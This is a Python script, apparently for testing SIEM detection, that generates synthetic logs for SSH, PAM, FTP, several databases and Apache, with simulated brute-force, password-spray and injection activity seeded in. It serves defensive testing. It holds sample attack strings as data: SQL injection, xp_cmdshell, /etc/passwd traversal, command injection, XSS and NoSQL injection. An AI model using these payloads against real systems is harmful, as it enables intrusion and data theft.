#!/usr/bin/env python3
"""
Comprehensive SIEM Test Log Generator
Generates 10,000+ lines of realistic logs for 56+ log types with embedded attack patterns
"""

import random
import os
from datetime import datetime, timedelta
from typing import List, Callable
import ipaddress
import hashlib
import uuid

# Configuration
LINES_PER_LOG = 10000
OUTPUT_DIR = "/home/utsav/siem-test-logs"

# Realistic data pools
USERNAMES = [
    "admin",
    "root",
    "john",
    "jane",
    "mike",
    "sarah",
    "david",
    "emma",
    "chris",
    "lisa",
    "postgres",
    "mysql",
    "nginx",
    "apache",
    "www-data",
    "deploy",
    "jenkins",
    "gitlab",
    "operator",
    "backup",
    "monitoring",
    "sysadmin",
    "devops",
    "security",
]

ATTACKER_USERNAMES = [
    "admin",
    "root",
    "administrator",
    "test",
    "guest",
    "user",
    "support",
    "oracle",
    "postgres",
    "mysql",
    "ftp",
    "anonymous",
    "info",
    "sales",
]

HOSTNAMES = [
    "web-prod-01",
    "web-prod-02",
    "db-master",
    "db-slave-01",
    "app-server-01",
    "app-server-02",
    "mail-01",
    "firewall-01",
    "proxy-01",
    "jump-host",
    "monitoring-01",
    "backup-server",
    "ci-runner-01",
    "api-gateway",
]

INTERNAL_IPS = [
    f"10.0.{random.randint(1, 10)}.{random.randint(1, 254)}" for _ in range(50)
]
EXTERNAL_IPS = [
    f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    for _ in range(100)
]

# Known malicious IPs for attack simulation
ATTACKER_IPS = [
    "185.220.101.42",
    "45.155.205.233",
    "194.165.16.98",
    "89.248.167.131",
    "141.98.10.121",
    "195.54.160.149",
    "45.95.169.231",
    "193.42.33.45",
    "185.156.73.54",
    "91.240.118.172",
    "45.146.165.37",
    "185.220.100.254",
]

URLS = [
    "/",
    "/login",
    "/api/users",
    "/api/products",
    "/admin",
    "/dashboard",
    "/api/v1/auth",
    "/api/v2/data",
    "/static/js/app.js",
    "/images/logo.png",
    "/health",
    "/metrics",
    "/graphql",
    "/api/search",
    "/download",
    "/upload",
]

MALICIOUS_URLS = [
    "/admin/config.php",
    "/.env",
    "/wp-admin/admin-ajax.php",
    "/phpmyadmin/",
    "/api/users?id=1%20OR%201=1",
    "/search?q=<script>alert(1)</script>",
    "/../../../etc/passwd",
    "/api/exec?cmd=whoami",
    "/shell.php",
    "/api/users/../../admin",
    "/.git/config",
    "/backup.sql",
    "/db.sql.gz",
    "/api/v1/users;cat%20/etc/passwd",
    "/login?redirect=javascript:alert(1)",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "curl/7.68.0",
    "python-requests/2.28.0",
    "PostmanRuntime/7.29.0",
]

MALICIOUS_USER_AGENTS = [
    "sqlmap/1.6.12",
    "nikto/2.1.6",
    "nmap scripting engine",
    "masscan/1.3.2",
    "gobuster/3.1.0",
    "dirbuster/1.0",
    "python-requests/2.28.0",
    "curl/7.68.0",
]

SQL_QUERIES = [
    "SELECT * FROM users WHERE id = 1",
    "UPDATE products SET price = 99.99 WHERE id = 5",
    "INSERT INTO orders (user_id, total) VALUES (1, 150.00)",
    "DELETE FROM sessions WHERE expires < NOW()",
    "SELECT name, email FROM customers LIMIT 100",
]

MALICIOUS_SQL = [
    "SELECT * FROM users WHERE id = 1 OR 1=1--",
    "'; DROP TABLE users;--",
    "UNION SELECT username, password FROM admin_users--",
    "SELECT * FROM users WHERE username = '' OR '1'='1'",
    "1; EXEC xp_cmdshell('whoami')--",
]


def random_timestamp(base_time: datetime, max_offset_hours: int = 24) -> datetime:
    offset = timedelta(seconds=random.randint(0, max_offset_hours * 3600))
    return base_time + offset


def format_syslog_timestamp(dt: datetime) -> str:
    return dt.strftime("%b %d %H:%M:%S")


def format_iso_timestamp(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def format_clf_timestamp(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def format_iis_timestamp(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%d %H:%M:%S")


# ==================== AUTHENTICATION LOGS ====================


def generate_ssh_auth_logs() -> List[str]:
    """Generate SSH authentication logs with brute force attacks"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    # Normal successful logins
    for _ in range(int(LINES_PER_LOG * 0.3)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES)
        ip = random.choice(INTERNAL_IPS + EXTERNAL_IPS[:20])
        port = random.randint(40000, 65000)
        logs.append(
            f"{ts} {hostname} sshd[{random.randint(1000, 9999)}]: Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:{hashlib.sha256(str(random.random()).encode()).hexdigest()[:43]}"
        )

    # Normal failed logins
    for _ in range(int(LINES_PER_LOG * 0.2)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES)
        ip = random.choice(EXTERNAL_IPS)
        port = random.randint(40000, 65000)
        logs.append(
            f"{ts} {hostname} sshd[{random.randint(1000, 9999)}]: Failed password for {user} from {ip} port {port} ssh2"
        )

    # ATTACK: Brute force from attacker IPs
    for attacker_ip in ATTACKER_IPS[:5]:
        attack_start = random_timestamp(base_time, 12)
        for i in range(200):  # 200 attempts per attacker
            ts = format_syslog_timestamp(attack_start + timedelta(seconds=i * 2))
            user = random.choice(ATTACKER_USERNAMES)
            port = random.randint(40000, 65000)
            logs.append(
                f"{ts} {hostname} sshd[{random.randint(1000, 9999)}]: Failed password for {'invalid user ' if random.random() > 0.5 else ''}{user} from {attacker_ip} port {port} ssh2"
            )

    # ATTACK: Password spray (same password, many users)
    spray_ip = random.choice(ATTACKER_IPS)
    spray_time = random_timestamp(base_time, 8)
    for user in ATTACKER_USERNAMES * 10:
        ts = format_syslog_timestamp(
            spray_time + timedelta(seconds=random.randint(0, 300))
        )
        port = random.randint(40000, 65000)
        logs.append(
            f"{ts} {hostname} sshd[{random.randint(1000, 9999)}]: Failed password for {user} from {spray_ip} port {port} ssh2"
        )

    # Session disconnects
    for _ in range(int(LINES_PER_LOG * 0.1)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES)
        ip = random.choice(INTERNAL_IPS)
        logs.append(
            f"{ts} {hostname} sshd[{random.randint(1000, 9999)}]: Disconnected from user {user} {ip} port {random.randint(40000, 65000)}"
        )

    # Fill remaining with connection events
    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        ip = random.choice(INTERNAL_IPS + EXTERNAL_IPS)
        logs.append(
            f"{ts} {hostname} sshd[{random.randint(1000, 9999)}]: Connection from {ip} port {random.randint(40000, 65000)} on {random.choice(INTERNAL_IPS)} port 22"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_pam_logs() -> List[str]:
    """Generate PAM authentication logs with privilege escalation attempts"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    services = ["sshd", "sudo", "su", "login", "gdm-password", "systemd-user"]

    # Normal PAM events
    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        service = random.choice(services)
        user = random.choice(USERNAMES)
        pid = random.randint(1000, 9999)

        event_type = random.choice(
            ["session opened", "session closed", "authentication success"]
        )
        if event_type == "session opened":
            logs.append(
                f"{ts} {hostname} {service}(pam_unix)[{pid}]: session opened for user {user} by (uid=0)"
            )
        elif event_type == "session closed":
            logs.append(
                f"{ts} {hostname} {service}(pam_unix)[{pid}]: session closed for user {user}"
            )
        else:
            logs.append(
                f"{ts} {hostname} {service}(pam_unix)[{pid}]: authentication success; logname={user} uid=1000 euid=0 tty=/dev/pts/{random.randint(0, 10)} ruser= rhost="
            )

    # ATTACK: Repeated sudo failures (privilege escalation attempt)
    attacker_user = random.choice(["www-data", "nginx", "apache"])
    attack_time = random_timestamp(base_time, 8)
    for i in range(150):
        ts = format_syslog_timestamp(attack_time + timedelta(seconds=i * 3))
        pid = random.randint(1000, 9999)
        logs.append(
            f"{ts} {hostname} sudo(pam_unix)[{pid}]: authentication failure; logname={attacker_user} uid=33 euid=0 tty=/dev/pts/0 ruser={attacker_user} rhost=  user=root"
        )

    # ATTACK: su to root attempts
    for _ in range(100):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(["www-data", "nobody", "daemon"])
        pid = random.randint(1000, 9999)
        logs.append(
            f"{ts} {hostname} su(pam_unix)[{pid}]: authentication failure; logname= uid=65534 euid=0 tty=pts/1 ruser={user} rhost=  user=root"
        )

    # Fill remaining
    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES)
        pid = random.randint(1000, 9999)
        logs.append(
            f"{ts} {hostname} sudo[{pid}]:     {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/{random.choice(['ls', 'cat', 'systemctl', 'apt'])}"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_vsftpd_logs() -> List[str]:
    """Generate vsftpd FTP logs with anonymous access attempts"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    # Normal FTP activity
    for _ in range(int(LINES_PER_LOG * 0.5)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES[:10])
        ip = random.choice(INTERNAL_IPS)
        action = random.choice(["OK LOGIN", "OK UPLOAD", "OK DOWNLOAD", "OK DELETE"])
        filename = f"/home/{user}/{random.choice(['report.pdf', 'data.csv', 'backup.tar.gz', 'config.xml'])}"

        if action == "OK LOGIN":
            logs.append(
                f'{ts} [pid {random.randint(1000, 9999)}] [ftp] {action}: Client "{ip}", "/{user}"'
            )
        else:
            logs.append(
                f'{ts} [pid {random.randint(1000, 9999)}] [{user}] {action}: Client "{ip}", "{filename}", {random.randint(1000, 10000000)} bytes'
            )

    # ATTACK: Anonymous login attempts
    for attacker_ip in ATTACKER_IPS:
        for _ in range(50):
            ts = format_syslog_timestamp(random_timestamp(base_time))
            logs.append(
                f'{ts} [pid {random.randint(1000, 9999)}] [ftp] FAIL LOGIN: Client "{attacker_ip}"'
            )

    # ATTACK: Brute force FTP
    for attacker_ip in ATTACKER_IPS[:3]:
        attack_time = random_timestamp(base_time, 6)
        for i in range(100):
            ts = format_syslog_timestamp(attack_time + timedelta(seconds=i))
            logs.append(
                f'{ts} [pid {random.randint(1000, 9999)}] [anonymous] FAIL LOGIN: Client "{attacker_ip}"'
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS)
        logs.append(f'{ts} [pid {random.randint(1000, 9999)}] CONNECT: Client "{ip}"')

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


# ==================== DATABASE LOGS ====================


def generate_mysql_error_logs() -> List[str]:
    """Generate MySQL error logs with SQL injection patterns"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    # Normal operations
    for _ in range(int(LINES_PER_LOG * 0.5)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        thread_id = random.randint(1, 1000)
        event = random.choice(
            [
                f"[Note] [MY-{random.randint(10000, 99999)}] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.32'",
                f"[Note] [MY-{random.randint(10000, 99999)}] [InnoDB] Buffer pool(s) load completed at {ts}",
                f"[Note] [MY-{random.randint(10000, 99999)}] [Server] Aborted connection {thread_id} to db: 'production' user: '{random.choice(USERNAMES)}' host: '{random.choice(INTERNAL_IPS)}'",
                f"[Warning] [MY-{random.randint(10000, 99999)}] [Server] Insecure configuration for --pid-file",
            ]
        )
        logs.append(f"{ts} {thread_id} {event}")

    # ATTACK: SQL injection attempts visible in errors
    for _ in range(200):
        ts = format_iso_timestamp(random_timestamp(base_time))
        thread_id = random.randint(1, 1000)
        malicious = random.choice(MALICIOUS_SQL)
        logs.append(
            f"{ts} {thread_id} [ERROR] [MY-013187] [Server] Query '{malicious}' failed with syntax error near '{malicious[-20:]}'"
        )

    # ATTACK: Access denied for suspicious users
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = format_iso_timestamp(random_timestamp(base_time))
            user = random.choice(["root", "admin", "sa", "dba"])
            logs.append(
                f"{ts} 0 [Warning] [MY-010055] [Server] Access denied for user '{user}'@'{attacker_ip}' (using password: YES)"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} {random.randint(1, 1000)} [Note] [MY-010914] [Server] Got timeout reading communication packets"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_mysql_query_logs() -> List[str]:
    """Generate MySQL general query logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        thread_id = random.randint(1, 500)
        query = random.choice(SQL_QUERIES)
        logs.append(f"{ts}\t{thread_id} Query\t{query}")

    # ATTACK: SQL injection queries
    for _ in range(300):
        ts = format_iso_timestamp(random_timestamp(base_time))
        thread_id = random.randint(1, 500)
        query = random.choice(MALICIOUS_SQL)
        logs.append(f"{ts}\t{thread_id} Query\t{query}")

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        thread_id = random.randint(1, 500)
        logs.append(
            f"{ts}\t{thread_id} Connect\t{random.choice(USERNAMES)}@{random.choice(INTERNAL_IPS)} on production"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_mysql_slow_logs() -> List[str]:
    """Generate MySQL slow query logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG // 4):  # Each entry is ~4 lines
        ts = format_iso_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES)
        ip = random.choice(INTERNAL_IPS)
        query_time = random.uniform(2.0, 30.0)
        rows = random.randint(100, 1000000)

        # Mix normal and malicious queries
        if random.random() > 0.9:
            query = random.choice(MALICIOUS_SQL)
        else:
            query = random.choice(SQL_QUERIES)

        logs.append(f"# Time: {ts}")
        logs.append(
            f"# User@Host: {user}[{user}] @ {ip} []  Id: {random.randint(1, 10000)}"
        )
        logs.append(
            f"# Query_time: {query_time:.6f}  Lock_time: {random.uniform(0, 0.1):.6f} Rows_sent: {rows}  Rows_examined: {rows * 10}"
        )
        logs.append(f"{query};")

    return logs


def generate_postgres_error_logs() -> List[str]:
    """Generate PostgreSQL error logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.5)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        user = random.choice(USERNAMES)
        db = random.choice(["production", "analytics", "staging"])

        event = random.choice(
            [
                f"LOG:  connection received: host={random.choice(INTERNAL_IPS)} port={random.randint(40000, 65000)}",
                f"LOG:  connection authorized: user={user} database={db}",
                f"LOG:  disconnection: session time: 0:05:{random.randint(10, 59)}.{random.randint(100, 999)} user={user} database={db}",
                f"LOG:  checkpoint starting: time",
                f"LOG:  checkpoint complete: wrote {random.randint(100, 10000)} buffers",
            ]
        )
        logs.append(f"{ts} [{pid}] {hostname} postgres {event}")

    # ATTACK: Failed authentication
    for attacker_ip in ATTACKER_IPS:
        for _ in range(50):
            ts = format_iso_timestamp(random_timestamp(base_time))
            pid = random.randint(1000, 9999)
            user = random.choice(["postgres", "admin", "root"])
            logs.append(
                f'{ts} [{pid}] {hostname} postgres FATAL:  password authentication failed for user "{user}"'
            )
            logs.append(
                f'{ts} [{pid}] {hostname} postgres DETAIL:  Connection matched pg_hba.conf line 92: "host all all 0.0.0.0/0 md5"'
            )

    # ATTACK: SQL injection errors
    for _ in range(150):
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        malicious = random.choice(MALICIOUS_SQL)
        logs.append(
            f'{ts} [{pid}] {hostname} postgres ERROR:  syntax error at or near "{malicious[:30]}" at character 45'
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        logs.append(
            f'{ts} [{pid}] {hostname} postgres LOG:  automatic vacuum of table "production.public.sessions"'
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_postgres_auth_logs() -> List[str]:
    """Generate PostgreSQL authentication logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        user = random.choice(USERNAMES)
        ip = random.choice(INTERNAL_IPS)
        db = random.choice(["production", "analytics", "staging"])
        logs.append(
            f"{ts} [{pid}] {hostname} postgres LOG:  connection authorized: user={user} database={db} SSL=on application_name=psql"
        )

    # ATTACK: Brute force
    for attacker_ip in ATTACKER_IPS:
        attack_time = random_timestamp(base_time, 6)
        for i in range(100):
            ts = format_iso_timestamp(attack_time + timedelta(seconds=i * 2))
            pid = random.randint(1000, 9999)
            user = random.choice(["postgres", "admin", "root", "pgsql"])
            logs.append(
                f'{ts} [{pid}] {hostname} postgres FATAL:  password authentication failed for user "{user}"'
            )
            logs.append(
                f"{ts} [{pid}] {hostname} postgres DETAIL:  Connection from {attacker_ip}:5432"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        user = random.choice(USERNAMES)
        logs.append(
            f"{ts} [{pid}] {hostname} postgres LOG:  disconnection: session time: 0:0{random.randint(1, 9)}:{random.randint(10, 59)} user={user} database=production"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_postgres_statement_logs() -> List[str]:
    """Generate PostgreSQL statement logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        user = random.choice(USERNAMES)
        query = random.choice(SQL_QUERIES)
        duration = random.uniform(0.1, 100)
        logs.append(
            f"{ts} [{pid}] {hostname} postgres LOG:  duration: {duration:.3f} ms  statement: {query}"
        )

    # ATTACK: SQL injection statements
    for _ in range(300):
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        query = random.choice(MALICIOUS_SQL)
        logs.append(
            f"{ts} [{pid}] {hostname} postgres LOG:  duration: 0.000 ms  statement: {query}"
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        pid = random.randint(1000, 9999)
        logs.append(
            f"{ts} [{pid}] {hostname} postgres LOG:  duration: {random.uniform(0.1, 10):.3f} ms  statement: COMMIT"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_oracle_alert_logs() -> List[str]:
    """Generate Oracle alert logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time)
        date_str = ts.strftime("%a %b %d %H:%M:%S %Y")

        event = random.choice(
            [
                f"Thread 1 advanced to log sequence {random.randint(1000, 9999)}",
                f"Current log# {random.randint(1, 5)} seq# {random.randint(1000, 9999)} mem# 0: /u01/app/oracle/oradata/ORCL/redo0{random.randint(1, 3)}.log",
                f"Archived Log entry {random.randint(10000, 99999)} added for thread 1 sequence {random.randint(1000, 9999)}",
                f"ALTER SYSTEM SET processes={random.randint(100, 500)} SCOPE=SPFILE;",
                f"ORA-00060: deadlock detected while waiting for resource",
                f"Starting ORACLE instance (normal)",
                f"License high water mark = {random.randint(50, 200)}",
            ]
        )
        logs.append(f"{date_str}")
        logs.append(event)

    return logs[:LINES_PER_LOG]


def generate_oracle_listener_logs() -> List[str]:
    """Generate Oracle listener logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        ip = random.choice(INTERNAL_IPS)
        service = random.choice(["ORCL", "ORCLPDB", "XE"])
        action = random.choice(["establish", "service_update", "service_register"])
        logs.append(
            f"{ts} * {action} * {service} * 0 * (ADDRESS=(PROTOCOL=tcp)(HOST={ip})(PORT=1521))"
        )

    # ATTACK: TNS Poisoning attempts
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = format_iso_timestamp(random_timestamp(base_time))
            logs.append(
                f"{ts} * error * TNS-12541: TNS:no listener * (ADDRESS=(PROTOCOL=tcp)(HOST={attacker_ip})(PORT=1521))"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(f"{ts} * service_update * ORCL * 0")

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_oracle_audit_logs() -> List[str]:
    """Generate Oracle audit logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    actions = [
        "LOGON",
        "LOGOFF",
        "SELECT",
        "UPDATE",
        "INSERT",
        "DELETE",
        "CREATE TABLE",
        "DROP TABLE",
        "ALTER USER",
    ]

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        user = random.choice(USERNAMES).upper()
        action = random.choice(actions)
        status = (
            "0" if random.random() > 0.1 else random.choice(["1017", "1005", "28000"])
        )
        logs.append(
            f"Audit trail: ACTION: '{action}' DATABASE USER: '{user}' PRIVILEGE: 'NONE' CLIENT USER: '{user}' CLIENT TERMINAL: 'pts/0' STATUS: {status} TIMESTAMP: {ts}"
        )

    # ATTACK: Failed logins
    for attacker_ip in ATTACKER_IPS:
        for _ in range(40):
            ts = format_iso_timestamp(random_timestamp(base_time))
            user = random.choice(["SYS", "SYSTEM", "ADMIN", "SCOTT"])
            logs.append(
                f"Audit trail: ACTION: 'LOGON' DATABASE USER: '{user}' PRIVILEGE: 'NONE' CLIENT USER: 'oracle' CLIENT TERMINAL: '{attacker_ip}' STATUS: 1017 TIMESTAMP: {ts}"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(
            f"Audit trail: ACTION: 'SESSION REC' DATABASE USER: 'SYS' PRIVILEGE: 'SYSDBA' CLIENT USER: 'oracle' CLIENT TERMINAL: 'pts/0' STATUS: 0 TIMESTAMP: {ts}"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[-27:])


def generate_sqlserver_error_logs() -> List[str]:
    """Generate SQL Server error logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.5)):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        spid = random.randint(50, 200)
        event = random.choice(
            [
                f"spid{spid}      SQL Server is starting",
                f"spid{spid}      Database 'master' is upgrading script",
                f"spid{spid}      Recovery is complete. This is an informational message only.",
                f"spid{spid}      Login succeeded for user '{random.choice(USERNAMES)}'. Connection: trusted.",
                f"spid{spid}      Database 'production' started.",
            ]
        )
        logs.append(f"{ts} Server      {event}")

    # ATTACK: Failed logins
    for attacker_ip in ATTACKER_IPS:
        for _ in range(50):
            ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            user = random.choice(["sa", "admin", "root"])
            logs.append(
                f"{ts} Logon       Error: 18456, Severity: 14, State: 5. Login failed for user '{user}'. Reason: Password did not match. [CLIENT: {attacker_ip}]"
            )

    # ATTACK: SQL injection errors
    for _ in range(100):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        logs.append(
            f"{ts} spid{random.randint(50, 200)}      Error: 102, Severity: 15, State: 1. Incorrect syntax near 'DROP'."
        )

    while len(logs) < LINES_PER_LOG:
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        logs.append(
            f"{ts} spid{random.randint(50, 200)}      Configuration option 'show advanced options' changed from 0 to 1."
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:23])


def generate_sqlserver_audit_logs() -> List[str]:
    """Generate SQL Server audit logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    actions = [
        "LOGIN",
        "LOGOUT",
        "SELECT",
        "INSERT",
        "UPDATE",
        "DELETE",
        "EXECUTE",
        "DATABASE_OBJECT_PERMISSION_CHANGE",
    ]

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        action = random.choice(actions)
        user = random.choice(USERNAMES)
        db = random.choice(["master", "production", "msdb"])
        status = "SUCCEEDED" if random.random() > 0.1 else "FAILED"

        logs.append(
            f"{ts}|{action}|{db}|{user}|{status}|{random.choice(INTERNAL_IPS)}|{random.randint(1, 10000)}"
        )

    return logs


def generate_sqlserver_transaction_logs() -> List[str]:
    """Generate SQL Server transaction logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        tx_id = f"0x{random.randint(0, 0xFFFFFFFF):08X}"
        spid = random.randint(50, 200)
        action = random.choice(
            [
                "BEGIN TRANSACTION",
                "COMMIT TRANSACTION",
                "ROLLBACK TRANSACTION",
                "SAVE TRANSACTION",
            ]
        )
        logs.append(f"{ts} spid{spid} {action} Transaction ID: {tx_id}")

    return logs


def generate_mongodb_server_logs() -> List[str]:
    """Generate MongoDB server logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    components = ["NETWORK", "STORAGE", "COMMAND", "QUERY", "WRITE", "INDEX", "ACCESS"]

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        component = random.choice(components)
        context = f"conn{random.randint(1, 1000)}"

        if component == "NETWORK":
            ip = random.choice(INTERNAL_IPS)
            msg = f"connection accepted from {ip}:{random.randint(40000, 65000)} #{random.randint(1, 10000)}"
        elif component == "COMMAND":
            db = random.choice(["production", "test", "admin"])
            msg = f'command {db}.$cmd appName: "MongoDB Shell" command: {random.choice(["find", "insert", "update", "delete"])} numYields:0 ok:1'
        else:
            msg = f"operation completed successfully"

        logs.append(f"{ts} I {component:8} [{context}] {msg}")

    # ATTACK: Failed auth
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = format_iso_timestamp(random_timestamp(base_time))
            logs.append(
                f"{ts} I ACCESS   [conn{random.randint(1, 1000)}] SASL SCRAM-SHA-256 authentication failed for root on admin from client {attacker_ip}:{random.randint(40000, 65000)} ; UserNotFound: Could not find user"
            )

    # ATTACK: NoSQL injection patterns
    for _ in range(100):
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(
            f'{ts} W QUERY    [conn{random.randint(1, 1000)}] Received malformed query: {{"$where": "this.password == \'x\' || 1==1"}}'
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} I STORAGE  [initandlisten] createCollection: local.startup_log"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_mongodb_audit_logs() -> List[str]:
    """Generate MongoDB audit logs in JSON format"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    actions = [
        "authenticate",
        "createCollection",
        "dropCollection",
        "find",
        "insert",
        "update",
        "delete",
        "createUser",
        "dropUser",
    ]

    for _ in range(LINES_PER_LOG):
        ts = format_iso_timestamp(random_timestamp(base_time))
        action = random.choice(actions)
        user = random.choice(USERNAMES)
        ip = random.choice(INTERNAL_IPS + ATTACKER_IPS[:3])
        db = random.choice(["production", "admin", "local"])
        result = 0 if random.random() > 0.1 else 18

        log_entry = f'{{"atype":"{action}","ts":{{"$date":"{ts}"}},"local":{{"ip":"127.0.0.1","port":27017}},"remote":{{"ip":"{ip}","port":{random.randint(40000, 65000)}}},"users":[{{"user":"{user}","db":"{db}"}}],"roles":[],"param":{{"db":"{db}"}},"result":{result}}}'
        logs.append(log_entry)

    return logs


# ==================== WEBSERVER LOGS ====================


def generate_apache_logs() -> List[str]:
    """Generate Apache access logs with web attacks"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]
    status_codes = [200, 200, 200, 200, 301, 302, 304, 400, 401, 403, 404, 500]

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_clf_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
        method = random.choice(methods)
        url = random.choice(URLS)
        status = random.choice(status_codes)
        size = random.randint(200, 50000)
        ua = random.choice(USER_AGENTS)

        logs.append(
            f'{ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} {size} "-" "{ua}"'
        )

    # ATTACK: SQL Injection attempts
    for attacker_ip in ATTACKER_IPS:
        for _ in range(50):
            ts = format_clf_timestamp(random_timestamp(base_time))
            url = random.choice(
                [
                    "/api/users?id=1%27%20OR%20%271%27=%271",
                    "/search?q=%27%20UNION%20SELECT%20*%20FROM%20users--",
                    "/login?user=admin%27--&pass=x",
